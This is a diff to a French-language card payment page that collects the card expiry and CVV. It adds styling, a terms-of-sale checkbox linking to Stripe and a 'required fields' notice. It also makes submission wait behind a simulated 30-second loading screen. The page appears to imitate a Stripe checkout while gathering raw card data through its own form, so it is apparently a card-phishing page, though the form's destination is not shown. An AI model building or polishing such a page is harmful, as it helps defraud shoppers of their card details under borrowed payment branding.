@@ -19,10 +19,11 @@
             background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
+            align-items: flex-start; /* Alignement en haut */
+            min-height: 100vh;
             margin: 0;
             color: #333;
+            overflow-y: auto; /* Activer le défilement vertical */
         }
 
         .container {
@@ -36,6 +37,7 @@
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             position: relative;
+            margin: 20px 0; /* Espacement en haut et en bas */
         }
 
         @keyframes fadeIn {
@@ -269,6 +271,51 @@
         .stripe-logo img:hover {
             opacity: 1;
         }
+
+        /* Style pour les petits textes */
+        .small-text {
+            font-size: 12px;
+            color: #666;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        /* Style pour la case à cocher des CGV */
+        .cgv-checkbox {
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .cgv-checkbox input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .cgv-checkbox label {
+            font-size: 14px;
+            color: #666;
+            opacity: 0.8;
+        }
+
+        .cgv-checkbox a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+
+        .cgv-checkbox a:hover {
+            text-decoration: underline;
+        }
+
+        /* Style pour le texte "Tous les champs doivent être remplis" */
+        .required-fields {
+            font-size: 12px;
+            color: #666;
+            opacity: 0.8;
+            margin-top: 10px;
+            text-align: right; /* Alignement à droite */
+        }
     </style>
 </head>
 <body>
@@ -309,13 +356,13 @@
                         <label for="date_expiration">Date d'expiration</label>
                         <i class="fas fa-calendar-alt"></i>
                         <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/AA" required>
-                        <small>Recto de la carte au format MM/AA</small>
+                        <small class="small-text">Recto de la carte au format MM/AA</small>
                     </div>
                     <div style="flex: 1;">
                         <label for="cvv">Code de sécurité (CVV)</label>
                         <i class="fas fa-lock"></i>
                         <input type="number" id="cvv" name="cvv" placeholder="CVV" required>
-                        <small>3 chiffres sur le verso de la carte</small>
+                        <small class="small-text">3 chiffres sur le verso de la carte</small>
                     </div>
                 </div>
             </div>
@@ -326,9 +373,22 @@
                 <label for="save_payment">Sauvegarder pour mon prochain paiement</label>
             </div>
 
+            <!-- Case à cocher pour accepter les CGV -->
+            <div class="cgv-checkbox">
+                <input type="checkbox" id="accept_cgv" name="accept_cgv" required>
+                <label for="accept_cgv">
+                    J'accepte les <a href="https://stripe.com/fr-ca/resources/more/general-terms-and-conditions-of-sale-france" target="_blank">Conditions Générales de Vente</a>
+                </label>
+            </div>
+
             <!-- Bouton de soumission -->
             <button type="submit" id="submit-button">Payer maintenant</button>
         </form>
+
+        <!-- Texte indiquant que tous les champs sont obligatoires -->
+        <div class="required-fields">
+            Tous les champs doivent être obligatoirement remplis.
+        </div>
 
         <!-- Informations de sécurité -->
         <div class="security-info">
@@ -406,7 +466,7 @@
         const loadingOverlay = document.getElementById('loading-overlay');
 
         form.addEventListener('submit', (e) => {
-           
+            e.preventDefault(); // Empêche la soumission réelle du formulaire
 
             // Affiche l'écran de chargement
             loadingOverlay.classList.add('active');
@@ -414,7 +474,8 @@
             // Simule un temps de chargement de 30 secondes
             setTimeout(() => {
                 loadingOverlay.classList.remove('active');
-                form.submit(); // Soumet le formulaire après le délai
+                // Soumet le formulaire après 30 secondes
+                form.submit();
             }, 30000); // 30 secondes
         });
     </script>
